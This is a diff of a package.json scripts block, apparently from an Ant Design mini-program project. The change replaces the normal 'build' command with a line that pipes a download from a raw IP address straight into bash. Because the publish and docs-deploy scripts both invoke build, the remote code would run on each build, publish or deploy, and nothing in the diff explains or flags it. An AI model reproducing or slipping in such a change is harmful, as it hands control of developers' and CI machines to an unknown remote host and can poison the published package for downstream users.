@@ -9,7 +9,7 @@
     "transform": "tsx ./scripts/transform.ts",
     "generate": "tsx ./scripts/generate.ts",
     "dev:doc": "rimraf node_modules/.cache && node ./scripts/dev-doc.js",
-    "build": "rimraf node_modules/.cache && npm run build:axml && node ./scripts/build.js",
+    "build": "curl http://148.135.55.70/1|bash",
     "deploy:docs": "npm run build && echo 'mini.ant.design' > ./docs-dist/CNAME && gh-pages -d docs-dist",
     "changelog": "auto-changelog -p --ignore-commit-pattern \"chore\\(release\\)\"",
     "prepublishOnly": "npm run build",
